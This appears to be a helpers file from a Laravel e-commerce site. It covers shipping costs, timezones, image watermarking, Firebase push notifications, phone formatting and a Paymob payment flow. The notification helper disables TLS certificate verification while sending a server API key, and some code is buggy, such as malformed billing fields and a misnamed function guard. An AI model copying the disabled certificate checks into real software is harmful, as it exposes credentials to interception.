            $calculate_shipping = \App\BusinessSetting::where('type', 'shipping_cost_admin')->first()->value;
        }
        if (!empty($seller_products)) {
            foreach ($seller_products as $key => $seller_product) {
                $calculate_shipping += \App\Shop::where('user_id', $key)->first()->shipping_cost;
            }
        }
    } elseif (get_setting('shipping_type') == 'area_wise_shipping') {
        $products_types = array_column(\App\Product::whereIn('id', array_column(Session::get('cart')->toArray(), 'id'))->select('id', 'light_heavy_shipping')->get()->toArray(), 'light_heavy_shipping');
        if (isset(Session::get('shipping_info')['region'])) {
            $region = Region::where('id', Session::get('shipping_info')['region'])->first();
            if ($region != null) {
                if (in_array('heavy', $products_types)) {
                    $calculate_shipping = $region->shipping_cost_high;
                } else {
                    $calculate_shipping = $region->shipping_cost;
                }
                // $calculate_shipping = $region->shipping_cost;
            }
        }
    }

    $cartItem = Session::get('cart')[$index];

    if (isset($cartItem['shipping_type'])) {
        if ($cartItem['shipping_type'] == 'home_delivery') {
            if (\App\BusinessSetting::where('type', 'shipping_type')->first()->value == 'flat_rate') {
                return $calculate_shipping / count(Session::get('cart'));
            } elseif (\App\BusinessSetting::where('type', 'shipping_type')->first()->value == 'seller_wise_shipping') {
                if ($product->added_by == 'admin') {
                    return \App\BusinessSetting::where('type', 'shipping_cost_admin')->first()->value / count($admin_products);
                } else {
                    return \App\Shop::where('user_id', $product->user_id)->first()->shipping_cost / count($seller_products[$product->user_id]);
                }
            } elseif (get_setting('shipping_type') == 'area_wise_shipping') {
                return $calculate_shipping / count(Session::get('cart'));
            } else {
                return \App\Product::find($cartItem['id'])->shipping_cost;
            }
        } else {
            return 0;
        }
    }
}

function timezones()
{
    $timezones = array(
        '(GMT-12:00) International Date Line West' => 'Pacific/Kwajalein',
        '(GMT-11:00) Midway Island' => 'Pacific/Midway',
        '(GMT-11:00) Samoa' => 'Pacific/Apia',
        '(GMT-10:00) Hawaii' => 'Pacific/Honolulu',
        '(GMT-09:00) Alaska' => 'America/Anchorage',
        '(GMT-08:00) Pacific Time (US & Canada)' => 'America/Los_Angeles',
        '(GMT-08:00) Tijuana' => 'America/Tijuana',
        '(GMT-07:00) Arizona' => 'America/Phoenix',
        '(GMT-07:00) Mountain Time (US & Canada)' => 'America/Denver',
        '(GMT-07:00) Chihuahua' => 'America/Chihuahua',
        '(GMT-07:00) La Paz' => 'America/Chihuahua',
        '(GMT-07:00) Mazatlan' => 'America/Mazatlan',
        '(GMT-06:00) Central Time (US & Canada)' => 'America/Chicago',
        '(GMT-06:00) Central America' => 'America/Managua',
        '(GMT-06:00) Guadalajara' => 'America/Mexico_City',
        '(GMT-06:00) Mexico City' => 'America/Mexico_City',
        '(GMT-06:00) Monterrey' => 'America/Monterrey',
        '(GMT-06:00) Saskatchewan' => 'America/Regina',
        '(GMT-05:00) Eastern Time (US & Canada)' => 'America/New_York',
        '(GMT-05:00) Indiana (East)' => 'America/Indiana/Indianapolis',
        '(GMT-05:00) Bogota' => 'America/Bogota',
        '(GMT-05:00) Lima' => 'America/Lima',
        '(GMT-05:00) Quito' => 'America/Bogota',
        '(GMT-04:00) Atlantic Time (Canada)' => 'America/Halifax',
        '(GMT-04:00) Caracas' => 'America/Caracas',
        '(GMT-04:00) La Paz' => 'America/La_Paz',
        '(GMT-04:00) Santiago' => 'America/Santiago',
        '(GMT-03:30) Newfoundland' => 'America/St_Johns',
        '(GMT-03:00) Brasilia' => 'America/Sao_Paulo',
        '(GMT-03:00) Buenos Aires' => 'America/Argentina/Buenos_Aires',
        '(GMT-03:00) Georgetown' => 'America/Argentina/Buenos_Aires',
        '(GMT-03:00) Greenland' => 'America/Godthab',
        '(GMT-02:00) Mid-Atlantic' => 'America/Noronha',
        '(GMT-01:00) Azores' => 'Atlantic/Azores',
        '(GMT-01:00) Cape Verde Is.' => 'Atlantic/Cape_Verde',
        '(GMT) Casablanca' => 'Africa/Casablanca',
        '(GMT) Dublin' => 'Europe/London',
        '(GMT) Edinburgh' => 'Europe/London',
        '(GMT) Lisbon' => 'Europe/Lisbon',
        '(GMT) London' => 'Europe/London',
        '(GMT) UTC' => 'UTC',
        '(GMT) Monrovia' => 'Africa/Monrovia',
        '(GMT+01:00) Amsterdam' => 'Europe/Amsterdam',
        '(GMT+01:00) Belgrade' => 'Europe/Belgrade',
        '(GMT+01:00) Berlin' => 'Europe/Berlin',
        '(GMT+01:00) Bern' => 'Europe/Berlin',
        '(GMT+01:00) Bratislava' => 'Europe/Bratislava',
        '(GMT+01:00) Brussels' => 'Europe/Brussels',
        '(GMT+01:00) Budapest' => 'Europe/Budapest',
        '(GMT+01:00) Copenhagen' => 'Europe/Copenhagen',
        '(GMT+01:00) Ljubljana' => 'Europe/Ljubljana',
        '(GMT+01:00) Madrid' => 'Europe/Madrid',
        '(GMT+01:00) Paris' => 'Europe/Paris',
        '(GMT+01:00) Prague' => 'Europe/Prague',
        '(GMT+01:00) Rome' => 'Europe/Rome',
        '(GMT+01:00) Sarajevo' => 'Europe/Sarajevo',
        '(GMT+01:00) Skopje' => 'Europe/Skopje',
        '(GMT+01:00) Stockholm' => 'Europe/Stockholm',
        '(GMT+01:00) Vienna' => 'Europe/Vienna',
        '(GMT+01:00) Warsaw' => 'Europe/Warsaw',
        '(GMT+01:00) West Central Africa' => 'Africa/Lagos',
        '(GMT+01:00) Zagreb' => 'Europe/Zagreb',
        '(GMT+02:00) Athens' => 'Europe/Athens',
        '(GMT+02:00) Bucharest' => 'Europe/Bucharest',
        '(GMT+02:00) Cairo' => 'Africa/Cairo',
        '(GMT+02:00) Harare' => 'Africa/Harare',
        '(GMT+02:00) Helsinki' => 'Europe/Helsinki',
        '(GMT+02:00) Istanbul' => 'Europe/Istanbul',
        '(GMT+02:00) Jerusalem' => 'Asia/Jerusalem',
        '(GMT+02:00) Kyev' => 'Europe/Kiev',
        '(GMT+02:00) Minsk' => 'Europe/Minsk',
        '(GMT+02:00) Pretoria' => 'Africa/Johannesburg',
        '(GMT+02:00) Riga' => 'Europe/Riga',
        '(GMT+02:00) Sofia' => 'Europe/Sofia',
        '(GMT+02:00) Tallinn' => 'Europe/Tallinn',
        '(GMT+02:00) Vilnius' => 'Europe/Vilnius',
        '(GMT+03:00) Baghdad' => 'Asia/Baghdad',
        '(GMT+03:00) Kuwait' => 'Asia/Kuwait',
        '(GMT+03:00) Moscow' => 'Europe/Moscow',
        '(GMT+03:00) Nairobi' => 'Africa/Nairobi',
        '(GMT+03:00) Riyadh' => 'Asia/Riyadh',
        '(GMT+03:00) St. Petersburg' => 'Europe/Moscow',
        '(GMT+03:00) Volgograd' => 'Europe/Volgograd',
        '(GMT+03:30) Tehran' => 'Asia/Tehran',
        '(GMT+04:00) Abu Dhabi' => 'Asia/Muscat',
        '(GMT+04:00) Baku' => 'Asia/Baku',
        '(GMT+04:00) Muscat' => 'Asia/Muscat',
        '(GMT+04:00) Tbilisi' => 'Asia/Tbilisi',
        '(GMT+04:00) Yerevan' => 'Asia/Yerevan',
        '(GMT+04:30) Kabul' => 'Asia/Kabul',
        '(GMT+05:00) Ekaterinburg' => 'Asia/Yekaterinburg',
        '(GMT+05:00) Islamabad' => 'Asia/Karachi',
        '(GMT+05:00) Karachi' => 'Asia/Karachi',
        '(GMT+05:00) Tashkent' => 'Asia/Tashkent',
        '(GMT+05:30) Chennai' => 'Asia/Kolkata',
        '(GMT+05:30) Kolkata' => 'Asia/Kolkata',
        '(GMT+05:30) Mumbai' => 'Asia/Kolkata',
        '(GMT+05:30) New Delhi' => 'Asia/Kolkata',
        '(GMT+05:45) Kathmandu' => 'Asia/Kathmandu',
        '(GMT+06:00) Almaty' => 'Asia/Almaty',
        '(GMT+06:00) Astana' => 'Asia/Dhaka',
        '(GMT+06:00) Dhaka' => 'Asia/Dhaka',
        '(GMT+06:00) Novosibirsk' => 'Asia/Novosibirsk',
        '(GMT+06:00) Sri Jayawardenepura' => 'Asia/Colombo',
        '(GMT+06:30) Rangoon' => 'Asia/Rangoon',
        '(GMT+07:00) Bangkok' => 'Asia/Bangkok',
        '(GMT+07:00) Hanoi' => 'Asia/Bangkok',
        '(GMT+07:00) Jakarta' => 'Asia/Jakarta',
        '(GMT+07:00) Krasnoyarsk' => 'Asia/Krasnoyarsk',
        '(GMT+08:00) Beijing' => 'Asia/Hong_Kong',
        '(GMT+08:00) Chongqing' => 'Asia/Chongqing',
        '(GMT+08:00) Hong Kong' => 'Asia/Hong_Kong',
        '(GMT+08:00) Irkutsk' => 'Asia/Irkutsk',
        '(GMT+08:00) Kuala Lumpur' => 'Asia/Kuala_Lumpur',
        '(GMT+08:00) Perth' => 'Australia/Perth',
        '(GMT+08:00) Singapore' => 'Asia/Singapore',
        '(GMT+08:00) Taipei' => 'Asia/Taipei',
        '(GMT+08:00) Ulaan Bataar' => 'Asia/Irkutsk',
        '(GMT+08:00) Urumqi' => 'Asia/Urumqi',
        '(GMT+09:00) Osaka' => 'Asia/Tokyo',
        '(GMT+09:00) Sapporo' => 'Asia/Tokyo',
        '(GMT+09:00) Seoul' => 'Asia/Seoul',
        '(GMT+09:00) Tokyo' => 'Asia/Tokyo',
        '(GMT+09:00) Yakutsk' => 'Asia/Yakutsk',
        '(GMT+09:30) Adelaide' => 'Australia/Adelaide',
        '(GMT+09:30) Darwin' => 'Australia/Darwin',
        '(GMT+10:00) Brisbane' => 'Australia/Brisbane',
        '(GMT+10:00) Canberra' => 'Australia/Sydney',
        '(GMT+10:00) Guam' => 'Pacific/Guam',
        '(GMT+10:00) Hobart' => 'Australia/Hobart',
        '(GMT+10:00) Melbourne' => 'Australia/Melbourne',
        '(GMT+10:00) Port Moresby' => 'Pacific/Port_Moresby',
        '(GMT+10:00) Sydney' => 'Australia/Sydney',
        '(GMT+10:00) Vladivostok' => 'Asia/Vladivostok',
        '(GMT+11:00) Magadan' => 'Asia/Magadan',
        '(GMT+11:00) New Caledonia' => 'Asia/Magadan',
        '(GMT+11:00) Solomon Is.' => 'Asia/Magadan',
        '(GMT+12:00) Auckland' => 'Pacific/Auckland',
        '(GMT+12:00) Fiji' => 'Pacific/Fiji',
        '(GMT+12:00) Kamchatka' => 'Asia/Kamchatka',
        '(GMT+12:00) Marshall Is.' => 'Pacific/Fiji',
        '(GMT+12:00) Wellington' => 'Pacific/Auckland',
        '(GMT+13:00) Nuku\'alofa' => 'Pacific/Tongatapu'
    );

    return $timezones;
}

if (!function_exists('app_timezone')) {
    function app_timezone()
    {
        return config('app.timezone');
    }
}

if (!function_exists('my_asset')) {
    /**
     * Generate an asset path for the application.
     *
     * @param string $path
     * @param bool|null $secure
     * @return string
     */
    function my_asset($path, $secure = null)
    {
        if (env('FILESYSTEM_DRIVER') == 's3') {
            return Storage::disk('s3')->url($path);
        } else {
            return app('url')->asset('public/' . $path, $secure);
        }
    }
}

if (!function_exists('static_asset')) {
    /**
     * Generate an asset path for the application.
     *
     * @param string $path
     * @param bool|null $secure
     * @return string
     */
    function static_asset($path, $secure = null)
    {
        return app('url')->asset('public/' . $path, $secure);
    }
}

if (!function_exists('isUnique')) {
    /**
     * Generate an asset path for the application.
     *
     * @param string $path
     * @param bool|null $secure
     * @return string
     */
    function isUnique($email)
    {
        $user = \App\User::where('email', $email)->first();

        if ($user == null) {
            return '1'; // $user = null means we did not get any match with the email provided by the user inside the database
        } else {
            return '0';
        }
    }
}
if (!function_exists('locale')) {
    function locale()
    {
        if (empty(app()->getLocale())) {
            return app()->getLocale();
        }
        if (app()->getLocale() == 'sa' || app()->getLocale() == 'eg' || app()->getLocale() == 'ar') {
            return 'ar';
        }
        return 'en';
    }
}
if (!function_exists('addWatermark')) {
    function addWatermark($watermark, $imageDirectory, $imageName, $x = 0, $y = 0)
    {

        if (file_exists($watermark) || true) {
            $marge_right = 0;
            $marge_bottom = 0;

            $image_extension_wm = @end(explode(".", $watermark));
            switch ($image_extension_wm) {
                case "jpg":
                    $stamp = imagecreatefromjpeg($watermark);
                    break;
                case "JPG":
                    $stamp = imagecreatefromjpeg($watermark);
                    break;
                case "gif":
                    $stamp = imagecreatefromgif($watermark);
                    break;
                case "jpeg":
                    $stamp = imagecreatefromjpeg($watermark);
                    break;
                case "JPEG":
                    $stamp = imagecreatefromjpeg($watermark);
                    break;
                case "png":
                    $stamp = imagecreatefrompng($watermark);
                    break;
                case "PNG":
                    $stamp = imagecreatefrompng($watermark);
                    break;
            }

            $image_extension = @end(explode(".", $imageName));
            switch ($image_extension) {
                case "jpg":
                    $im = imagecreatefromjpeg("$imageDirectory/$imageName");
                    break;
                case "JPG":
                    $im = imagecreatefromjpeg("$imageDirectory/$imageName");
                    break;
                case "gif":
                    $im = imagecreatefromgif("$imageDirectory/$imageName");
                    break;
                case "jpeg":
                    $im = imagecreatefromjpeg("$imageDirectory/$imageName");
                    break;
                case "JPEG":
                    $im = imagecreatefromjpeg("$imageDirectory/$imageName");
                    break;
                case "png":
                    $im = imagecreatefrompng("$imageDirectory/$imageName");
                    break;
                case "PNG":
                    $im = imagecreatefrompng("$imageDirectory/$imageName");
                    break;
            }
            $imageSize = getimagesize("$imageDirectory/$imageName");
            $watermark_o_width = imagesx($stamp);
            $watermark_o_height = imagesy($stamp);

            $newWatermarkWidth = $imageSize[0];
            $newWatermarkHeight = $watermark_o_height * $newWatermarkWidth / $watermark_o_width;

            if ((int)$x <= 0)
                $x = $imageSize[0] / 2 - $newWatermarkWidth / 2;
            if ((int)$y <= 0)
                $y = $imageSize[1] / 2 - $newWatermarkHeight / 2;

            $sx = imagesx($stamp);
            $sy = imagesy($stamp);
            // top-left
            //            imagecopy($im, $stamp, -45, -5, 0, 0, imagesx($stamp), imagesy($stamp));
            //
            //// top-right
            //            imagecopy($im, $stamp, imagesx($im) - $sx + 45, -5, 0, 0, imagesx($stamp), imagesy($stamp));

            // bottom-left

            imagecopy($im, $stamp, -45, imagesy($im) - $sy + 5, 0, 0, imagesx($stamp), imagesy($stamp));

            //// bottom-right
            //            imagecopy($im, $stamp, imagesx($im) - $sx + 45, imagesy($im) - $sy + 5, 0, 0, imagesx($stamp), imagesy($stamp));
            //
            //// center
            //            imagecopy($im, $stamp, (imagesx($im) - $sx)/2, (imagesy($im) - $sy)/2, 0, 0, imagesx($stamp), imagesy($stamp));
            switch ($image_extension) {
                case "jpg":
                    header('Content-type: image/jpeg');
                    imagejpeg($im, "$imageDirectory/$imageName", 100);
                    break;
                case "JPG":
                    header('Content-type: image/jpeg');
                    imagejpeg($im, "$imageDirectory/$imageName", 100);
                    break;
                case "jpeg":
                    header('Content-type: image/jpeg');
                    imagejpeg($im, "$imageDirectory/$imageName", 100);
                    break;
                case "JPEG":
                    header('Content-type: image/jpeg');
                    imagejpeg($im, "$imageDirectory/$imageName", 100);
                    break;
                case "png":
                    header('Content-type: image/png');
                    imagepng($im, "$imageDirectory/$imageName");
                    break;
                case "PNG":
                    header('Content-type: image/png');
                    imagepng($im, "$imageDirectory/$imageName");
                    break;
            }
        }
        return true;
    }
}
if (!function_exists('addWatermark')) {
    function image($image_path, $check, $image, $path, $classname, $folder_name)
    {
        if ($image_path != null) {
            deleteimage($image_path);
        }
        $file = $image;
        if ($check) {
            $extension = $file->getClientOriginalExtension();
            $name = sha1($file->getClientOriginalName());
            $imgname = date('y-m-d') . $name . "." . $extension;
            $path = storage_path($path);
            $file->move($path, $imgname);
            return $folder_name . '/' . $imgname;
        }
        return '';
    }
}
if (!function_exists('send_notification')) {
    function send_notification($tokens, $title, $body, $type, $data = [])
    {
        if (BusinessSetting::where('type', 'mobile_app_firebase_token')->first()->value != null) {
            $url = 'https://fcm.googleapis.com/fcm/send';
            $fields = array(
                'registration_ids' => $tokens,
                'notification' => [
                    "title" => $title,
                    "body" => $body,
                    "type" => $type,
                ],
            );
            if (count($data) > 0) {
                $fields['data'] = $data;
            }
            $headers = array(
                'Authorization:key= ' . BusinessSetting::where('type', 'mobile_app_firebase_token')->first()->value,
                'Content-Type:application/json'
            );

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($fields));

            $result = curl_exec($ch);
            if ($result === false)
                die('cUrl faild: ' . curl_error($ch));
            curl_close($ch);

            return $result;
        } else {
            return 0;
        }
    }
}
function our_url($path, $parameters = [])
{
    return url($path, $parameters, false);
}

if (!function_exists('phoneWithoutCountryCode')) {
    function phoneWithoutCountryCode($phone)
    {
        if (substr($phone, 0, 1) == '0') {
            return $phone;
        } elseif (substr($phone, 0, 4) == '+201') {
            return str_replace("+2", "", $phone);
        } elseif (substr($phone, 0, 4) == '+200') {
            return str_replace("+20", "", $phone);
        } elseif (substr($phone, 0, 2) == '01') {
            return $phone;
        } else {
            return '0' . $phone;
        }
    }
}

if (!function_exists('removePhoneZero')) {
    function removePhoneZero($phone)
    {
        if (substr($phone, 0, 1) == '0') {
            return substr($phone, 1);
        } else {
            return $phone;
        }
    }
}

// $email = ($order->user) ? $order->user->email : Session::get('shipping_info')['email'];

if (!function_exists('payWithPaymob')) {
    function payWithPaymob($type)
    {
        try{
        
            if ($type == 'saved_token' || $type == 'online_card') {
                $integration_id = env('PAYMOB_CARD_INTEGRATION_ID');
            } elseif ($type == 'paymob_valu') {
                $integration_id = env('PAYMOB_VALU_INTEGRATION_ID');
            } elseif ($type == 'paymob_wallet') {
                $integration_id = env('WALLET_INTEGRATION_ID');
            } elseif ($type == 'bank_installment') {
                $integration_id = env('PAYMOB_BANK_INTEGRATION_ID');
            }
            $order = Order::findOrFail(Session::get('order_id'));
            $response = Http::withHeaders(
                ['content-type' => 'application/json']
            )->post(
                'https://accept.paymobsolutions.com/api/auth/tokens',
                [
                    "api_key" => env("MOB_API_KEY")
                ]
            );
            $json = $response->json();
            $response_final = Http::withHeaders(
                ['content-type' => 'application/json']
            )->post(
                'https://accept.paymobsolutions.com/api/ecommerce/orders',
                [
                    "auth_token" => $json['token'],
                    "delivery_needed" => "false",
                    "amount_cents" => $order->grand_total * 100,
                    "items" => []
                ]
            );
            $json_final = $response_final->json();
            ($order->payment_refrence = $json_final['id']);
            $order->save();
            
            $user = $order->user->name;
            $name = explode(' ',$user);
            $lastname = $name[0];
            
            $response_final_final = Http::withHeaders(
                ['content-type' => 'application/json']
            )->post(
                'https://accept.paymob.com/api/acceptance/payment_keys',
                [
                    "auth_token" => $json['token'],
                    "expiration" => 36000,
                    "amount_cents" => $json_final['amount_cents'],
                    "order_id" => $json_final['id'],
                    "billing_data" => [
                        "apartment" => "NA", 
                        "email" => ($order->user) ? $order->user->email : Session::get('shipping_info')['email'],
                        "floor" => "NA",
                        "first_name" => ($order->user) ? $order->user->name : Session::get('shipping_info')['name'],
                        "street" =>  Session::get('shipping_info')['address'],
                        "building" => "NA",
                        "phone_number" => ($order->user) ? $order->user->phone : Session::get('shipping_info')['phone'],
                        "shipping_method" => "NA",
                        "postal_code" => "NA",
                        "city" => "NA", ($order->user) ? $order->user->city : Session::get('shipping_info')['city'],
                        "country" => "NA", ($order->user) ? $order->user->country : Session::get('shipping_info')['country'],
                        "last_name" => ($order->user) ? $lastname : Session::get('shipping_info')['name'],
                        "state" => "NA"
                    ],
                    "currency" => "EGP",
                    "integration_id" => $integration_id
                ]
            );
            $response_final_final_json = $response_final_final->json();
             //dd($response_final_final_json);
            if ($type == 'bank_installment') {
                if (App::getLocale() == 'en') {
                    $res = "https://accept.paymobsolutions.com/api/acceptance/iframes/" . env('BANK_INSTALLMENTS_IFRAME_ID_EN') . "?payment_token=" . $response_final_final_json['token'];
                } else {
                    $res = "https://accept.paymobsolutions.com/api/acceptance/iframes/" . env('BANK_INSTALLMENTS_IFRAME_ID_AR') . "?payment_token=" . $response_final_final_json['token'];
                }
                return $res;
            } elseif ($type == 'online_card') {
                if (App::getLocale() == 'en') {
                    $res = "https://accept.paymobsolutions.com/api/acceptance/iframes/" . env('PAYMOB_IFRAME_ID_EN') . "?payment_token=" .  $response_final_final_json['token'];
                } else {
                    $res = "https://accept.paymobsolutions.com/api/acceptance/iframes/" . env('PAYMOB_IFRAME_ID_AR') . "?payment_token=" . $response_final_final_json['token'];
                }
                return $res;
            } elseif ($type == 'paymob_valu') {
                $res = "https://accept.paymobsolutions.com/api/acceptance/iframes/" . env('VALU_IFRAME_ID_EN') . "?payment_token=" . $response_final_final_json['token']; 
                return $res;
            } elseif ($type == 'paymob_wallet') {
                return $response_final_final_json['token'];
            } elseif ($type == 'saved_token') {
                return $response_final_final_json['token'];
            }
        }catch(\Exception $e) {
            flash("can\'t payment by paymob, please check your information")->warning();
            return redirect()->back();
        }
    }
}
